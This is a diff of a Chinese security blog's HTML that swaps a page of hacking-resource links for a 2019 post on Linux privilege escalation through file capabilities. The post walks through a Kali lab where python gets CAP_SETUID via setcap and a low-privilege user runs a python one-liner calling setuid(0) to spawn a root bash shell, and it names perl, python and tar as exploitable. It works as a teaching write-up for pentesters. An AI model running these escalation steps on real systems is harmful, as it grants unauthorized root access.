@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>九世的博客</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="九世的博客">
+  <title>setcap设置的文件可控造成的提权 | 九世的博客</title>
+  <meta name="keywords" content=" Linux提权 ">
+  <meta name="description" content="setcap设置的文件可控造成的提权 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -52,7 +52,7 @@
 </div>
 
 <body>
-<aside class="nav mobile">
+<aside class="nav">
     <div class="nav-left">
         <a href="/" class="avatar_target">
     <img class="avatar" src="/img/avatar.jpg">
@@ -1172,12 +1172,49 @@
         </div>
     </div>
 </aside>
-<div class="post index">
+<div class="post">
     <div class="pjax">
-        <article class="index">
-            <div class="toc-ref">
+        <article id="post-setcap设置的文件可控造成的提权" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Hacking"><span class="toc-text">Hacking</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#信息情报"><span class="toc-text">信息情报</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#论坛"><span class="toc-text">论坛</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#搜索引擎"><span class="toc-text">搜索引擎</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#国外博客"><span class="toc-text">国外博客</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#红队"><span class="toc-text">红队</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit"><span class="toc-text">exploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#APT"><span class="toc-text">APT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#在线沙盒"><span class="toc-text">在线沙盒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OWASP"><span class="toc-text">OWASP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows漏洞利用开发"><span class="toc-text">windows漏洞利用开发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#编程"><span class="toc-text">编程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#黑苹果"><span class="toc-text">黑苹果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#推荐的公众号"><span class="toc-text">推荐的公众号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关于九世"><span class="toc-text">关于九世</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#博客平台"><span class="toc-text">博客平台</span></a></li></ol>
+        <h1 class="article-title">setcap设置的文件可控造成的提权</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+        <span class="tag">
+            
+            <a href="javascript:" class="color3">Linux提权</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title="更新时间: 2019-12-01 22:39:38">2019-12-01 22:38</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-SUID"><span class="toc-text">0x01 SUID</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-牛刀小试"><span class="toc-text">0x02 牛刀小试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03实验"><span class="toc-text">0x03实验</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04结论"><span class="toc-text">0x04结论</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05参考链接"><span class="toc-text">0x05参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1190,98 +1227,75 @@
     }
 </style>
 </div>
-            <h1 id="Hacking"><a href="#Hacking" class="headerlink" title="Hacking"></a>Hacking</h1><h3 id="信息情报"><a href="#信息情报" class="headerlink" title="信息情报"></a>信息情报</h3><ul>
-<li><a href="https://www.freebuf.com">Freebuf</a></li>
-<li><a href="https://start.me/p/X20Apn">听风者资源情报</a>  </li>
-<li><a href="https://www.anquanke.com/">安全客 - 安全资讯平台</a>  </li>
-<li><a href="https://bowen.navisec.it/">网络安全博客 NaviSec.it – 纳威安全导航 | 网络安全导航</a>  </li>
-<li><a href="https://www.sec-wiki.com/">安全维基</a>  </li>
-</ul>
-<h3 id="论坛"><a href="#论坛" class="headerlink" title="论坛"></a>论坛</h3><ul>
-<li><a href="https://xz.aliyun.com/">先知社区</a>  </li>
-<li><a href="https://www.t00ls.net/">T00LS | 低调求发展 - 潜心习安全 - T00ls.Net</a>  </li>
-<li><a href="https://www.shentoushi.top/index.php/Go/?url=https://bithack.io/&amp;LinkId=453">通证化安全生态技术社区</a>  </li>
-</ul>
-<h3 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h3><ul>
-<li><a href="https://www.zoomeye.org/">钟馗之眼</a>  </li>
-<li><a href="https://www.shodan.io/">shodan</a>  </li>
-<li><a href="https://fofa.so/">FOFA网络空间测绘系统</a>  </li>
-<li><a href="https://www.google.com/">Google</a>  </li>
-</ul>
-<h3 id="国外博客"><a href="#国外博客" class="headerlink" title="国外博客"></a>国外博客</h3><ul>
-<li><a href="http://www.fuzzysecurity.com">FuzzySecurity | Home</a>  </li>
-<li><a href="http://www.hackingarticles.in">Hacking Articles - Raj Chandel’s Blog</a>  </li>
-<li><a href="https://r00tk1ts.github.io/">r00tk1t’s blog</a>  </li>
-<li><a href="http://niiconsulting.com">Cyber Security Consulting India UAE USA | Cyber Security Services</a>  </li>
-<li><a href="https://highon.coffee">HighOn.Coffee • Security Research • Penetration Testing Blog</a>  </li>
-<li><a href="https://unit42.paloaltonetworks.com/">Unit 42 - Latest Cyber Security Research | Palo Alto Networks</a>  </li>
-<li><a href="https://threat.tevora.com">Threat Blog</a>  </li>
-<li><a href="https://pentester.land">Pentester Land · Offensive Infosec</a>  </li>
-<li><a href="https://pentest.blog/">Pentest Blog – Inn for security folks</a>  </li>
-<li><a href="https://astr0baby.wordpress.com/">Astr0baby’s not so random thoughts <strong>_</strong> rand() % 100; | @astr0baby on Twitter for fresh randomness</a>  </li>
-<li><a href="https://www.hackingarticles.in">Hacking Articles - Raj Chandel’s Blog</a>  </li>
-<li><a href="https://lsdsecurity.com/">Logan S Diomedi – lsdsecurity – A personal repository of security writeups and projects I put together…</a>  </li>
-<li><a href="https://devco.re/blog/">最新訊息 News | DEVCORE 戴夫寇爾</a>  </li>
-<li><a href="https://www.fortinet.com/blog">Fortinet Blog</a>  </li>
-<li><a href="http://www.greyhathacker.net/">GreyHatHacker.NET | Malware, Vulnerabilities, Exploits and more . . .</a></li>
-</ul>
-<h3 id="红队"><a href="#红队" class="headerlink" title="红队"></a>红队</h3><ul>
-<li><a href="https://ired.team/">What is this? - Red Teaming Experiments</a>  </li>
-<li><a href="https://pentestlab.blog">Penetration Testing Lab | Offensive Techniques &amp; Methodologies</a>  </li>
-<li><a href="https://github.com/sbilly/awesome-security">GitHub - sbilly/awesome-security: A collection of awesome software, libraries, documents, books, resources and cools stuffs about security.</a>  </li>
-<li><a href="https://github.com/foobarto/redteam-notebook">GitHub - foobarto/redteam-notebook: Collection of commands, tips and tricks and references I found useful during preparation for OSCP exam.</a>  </li>
-<li><a href="https://www.peerlyst.com/posts/the-red-team-wiki-chiheb-chebbi?utm_source=twitter&amp;utm_medium=social&amp;utm_content=peerlyst_post&amp;utm_campaign=peerlyst_shared_post">Peerlyst</a>  </li>
-<li><a href="https://github.com/shr3ddersec/Shr3dKit">GitHub - shr3ddersec/Shr3dKit: Red Team Tool Kit</a>  </li>
-<li><a href="https://blog.sublimesecurity.com">Sublime Thoughts</a>  </li>
-<li><a href="https://hunter2.gitbook.io">Darth Sidious - DarthSidious</a>  </li>
-</ul>
-<h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><ul>
-<li><a href="https://www.exploit-db.com/">Exploit Database - Exploits for Penetration Testers, Researchers, and Ethical Hackers</a>  </li>
-<li><a href="https://packetstormsecurity.com/files/tags/exploit/">Exploit Files ≈ Packet Storm</a>  </li>
-<li><a href="https://github.com/SecWiki/windows-kernel-exploits">GitHub - SecWiki/windows-kernel-exploits: windows-kernel-exploits Windows平台提权漏洞集合</a>  </li>
-<li><a href="https://github.com/SecWiki/linux-kernel-exploits">GitHub - SecWiki/linux-kernel-exploits: linux-kernel-exploits Linux平台提权漏洞集合</a>  </li>
-<li><a href="https://github.com/CIAYSE/LinuxFlaw">GitHub - CIAYSE/LinuxFlaw: This repo records all the vulnerabilities of linux software I have reproduced in my local workspace</a>  </li>
-<li><a href="https://bugs.hacking8.com/tiquan/">提权辅助网页</a>  </li>
-</ul>
-<h3 id="APT"><a href="#APT" class="headerlink" title="APT"></a>APT</h3><ul>
-<li><a href="https://ti.qianxin.com/blog/articles/oceanlotus-attacks-to-indochinese-peninsula-evolution-of-targets-techniques-and-procedure/">奇安信威胁情报中心</a>  </li>
-<li><a href="https://github.com/blackorbird/APT_REPORT">GitHub - blackorbird/APT_REPORT: Interesting apt report collection and some special ioc express</a>  </li>
-<li><a href="https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/blob/master/README.md">APT_CyberCriminal_Campagin_Collections/README.md at master · CyberMonitor/APT_CyberCriminal_Campagin_Collections · GitHub</a>  </li>
-<li><a href="https://github.com/StrangerealIntel/CyberThreatIntel">GitHub - StrangerealIntel/CyberThreatIntel: Analysis of malware and Cyber Threat Intel of APT and cybercriminals groups</a>  </li>
-<li><a href="https://mp.weixin.qq.com/s/qv3pYEzi08DMydqUj1dSRw">威胁情报</a>  </li>
-</ul>
-<h3 id="在线沙盒"><a href="#在线沙盒" class="headerlink" title="在线沙盒"></a>在线沙盒</h3><ul>
-<li><a href="https://app.any.run/">Interactive Online Malware Analysis Sandbox - ANY.RUN</a>  </li>
-</ul>
-<h3 id="OWASP"><a href="#OWASP" class="headerlink" title="OWASP"></a>OWASP</h3><ul>
-<li><a href="https://www.owasp.org">OWASP</a>  </li>
-</ul>
-<h3 id="windows漏洞利用开发"><a href="#windows漏洞利用开发" class="headerlink" title="windows漏洞利用开发"></a>windows漏洞利用开发</h3><ul>
-<li><a href="http://niiconsulting.com/checkmate/2018/02/malware-development-welcome-dark-side-part-2-1/">Malware Development – Welcome to the Dark Side: Part 2-1 – Checkmate</a>  </li>
-</ul>
-<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ul>
-<li><a href="https://github.com/Jessicahust/books">GitHub - Jessicahust/books: 研究生看过的书籍</a>  </li>
-<li><a href="https://www.runoob.com/">菜鸟教程 - 学的不仅是技术，更是梦想！</a>  </li>
-</ul>
-<h2 id="黑苹果"><a href="#黑苹果" class="headerlink" title="黑苹果"></a>黑苹果</h2><ul>
-<li><a href="https://blog.daliansky.net">黑果小兵的部落阁</a>  </li>
-</ul>
-<h2 id="推荐的公众号"><a href="#推荐的公众号" class="headerlink" title="推荐的公众号"></a>推荐的公众号</h2><ul>
-<li>即刻安全</li>
-<li>黑鸟</li>
-<li>黑白之道</li>
-<li>安全祖师爷</li>
-<li>雷神众测</li>
-<li>黑白二进制</li>
-</ul>
-<h2 id="关于九世"><a href="#关于九世" class="headerlink" title="关于九世"></a>关于九世</h2><p>这是<strong>九世</strong>的个人站。</p>
-<p>到目前为止已经写了<code class="article_number"></code>篇文章， 共<code class="site_word_count"></code>字。</p>
-<p>本站访问人数：<code class="site_uv"></code>人次 ， 访问量：<code class="site_pv"></code>次</p>
-<h2 id="博客平台"><a href="#博客平台" class="headerlink" title="博客平台"></a>博客平台</h2><p>这个博客通过 <a href="https://hexo.io/">Hexo</a> 生成，部署在 <a href="https://pages.github.com/">GitHub Pages</a>，主题 <a href="https://github.com/yelog/hexo-theme-3-hexo">3-hexo</a> 已经在github上开源</p>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x01-SUID"><a href="#0x01-SUID" class="headerlink" title="0x01 SUID"></a>0x01 SUID</h2><p>能力介绍<br>Linux中的功能是什么</p>
+<p>在获得功能之前，我们只有特权和非特权进程的二进制系统，并且出于执行权限检查的目的，传统的UNIX实现将进程分为两类：特权进程（称为超级用户或根）和非特权进程（其有效UID为非零）。</p>
+<p>功能是将内核用户或内核级程序的特权分成小块的那些权限，以便可以使进程有足够的能力执行特定的特权任务。</p>
+<p>功能和SUID之间的区别</p>
+<p>SUID： SUID代表设置的用户ID，并允许用户以文件所有者的身份执行文件。这被定义为授予用户临时权限，使其在文件所有者（而不是运行文件所有者）的权限下运行程序/文件。使用“查找”命令可以很容易地检测到。要查找在当前目录中设置了SUID的所有文件，我们可以使用-perm选项，该选项将仅打印许可权设置为4000的文件（允许进程临时使用root的权限执行）</p>
+<p>给予某个文件拥有临时权限的命令<br>例子：</p>
+<pre><code>chmod u+s /usr/bin/python
+</code></pre><p>使用find命令可以找出SUID文件</p>
+<pre><code>find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre><p><img src="https://s2.ax1x.com/2019/12/01/Qmmes0.png" alt="Qmmes0.png"></p>
+<h2 id="0x02-牛刀小试"><a href="#0x02-牛刀小试" class="headerlink" title="0x02 牛刀小试"></a>0x02 牛刀小试</h2><p>setcap详解：<a href="https://www.cnblogs.com/nf01/articles/10418141.html" target="_blank" rel="noopener">setcap详解 - 农夫运维 - 博客园</a><br>setcap简要说明：</p>
+<pre><code> Capabilities的主要思想在于分割root用户的特权，即将root的特权分割成不同的能力，每种能力代表一定的特权操作。例如：能力CAP_SYS_MODULE表示用户能够加载(或卸载)内核模块的特权操作，而CAP_SETUID表示用户能够修改进程用户身份的特权操作。在Capbilities中系统将根据进程拥有的能力来进行特权操作的访问控制。
+</code></pre><p>getcap：检索setcap所设置的文件</p>
+<pre><code>getcap -r  / 2&gt;/dev/null
+</code></pre><p><img src="https://s2.ax1x.com/2019/12/01/QmnH9H.png" alt="QmnH9H.png"></p>
+<h2 id="0x03实验"><a href="#0x03实验" class="headerlink" title="0x03实验"></a>0x03实验</h2><pre><code>OS：kali
+测试用户：root、test
+</code></pre><p>先用root用户给予python SUID</p>
+<pre><code>chmod u+s /usr/bin/python
+</code></pre><p>查找一波对应的SUID权限的文件,确定是否给予成功</p>
+<pre><code>find / -perm -u=s -type f 2&gt;/dev/null
+</code></pre><p><img src="https://s2.ax1x.com/2019/12/01/Qm1t9U.png" alt="Qm1t9U.png"></p>
+<p>复制python到/tmp目录下，拟态和文章类似的构造</p>
+<pre><code>cp /usr/bin/python
+</code></pre><p><img src="https://s2.ax1x.com/2019/12/01/Qm3OJK.png" alt="Qm3OJK.png"></p>
+<p>setcap给予tmp目录下的python一个用户临时执行权限</p>
+<pre><code>setcap CAP_SETUID+ep /tmp/python
+</code></pre><p><img src="https://s2.ax1x.com/2019/12/01/Qm8ues.png" alt="Qm8ues.png"></p>
+<p>切换至test用户，执行以下命令即可获取一个root权限</p>
+<pre><code>getcap -r / 2&gt;/dev/null #查询被赋予权限的文件
+</code></pre><p><img src="https://s2.ax1x.com/2019/12/01/Qm8sSO.png" alt="Qm8sSO.png"></p>
+<pre><code>./python -c &#39;import os;os.setuid(0);os.system(&quot;/bin/bash&quot;)&#39;
+</code></pre><p><img src="https://s2.ax1x.com/2019/12/01/Qm8hkt.png" alt="Qm8hkt.png"></p>
+<h2 id="0x04结论"><a href="#0x04结论" class="headerlink" title="0x04结论"></a>0x04结论</h2><p>getcap -r / 2&gt;/dev/null #查询被赋予CAP_SETUID权限的文件，来获取某些文件是否有利用的价值。目前得出可以利用用的几个</p>
+<pre><code>perl
+python
+tar
+</code></pre><h2 id="0x05参考链接"><a href="#0x05参考链接" class="headerlink" title="0x05参考链接"></a>0x05参考链接</h2><p><a href="https://www.hackingarticles.in/" target="_blank" rel="noopener">Hacking Articles - Raj Chandel’s Blog</a><br><a href="http://man7.org/linux/man-pages/man8/getcap.8.html" target="_blank" rel="noopener">getcap(8) - Linux manual page</a><br><a href="https://www.cnblogs.com/nf01/articles/10418141.html" target="_blank" rel="noopener">setcap详解 - 农夫运维 - 博客园</a>  </p>
 
-        </article>
-        
-        
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>setcap设置的文件可控造成的提权</p>
+    
+    <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
+    <p><span class="copy-title">发布时间:</span>2019-12-01, 22:38:34</p>
+    <p><span class="copy-title">最后更新:</span>2019-12-01, 22:39:38</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/9dcc308e.html" title="setcap设置的文件可控造成的提权">http://422926799.github.io/posts/9dcc308e.html</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
     </div>
     <div class="copyright">
         <p class="footer-entry">©2016-2019 Yelog</p>
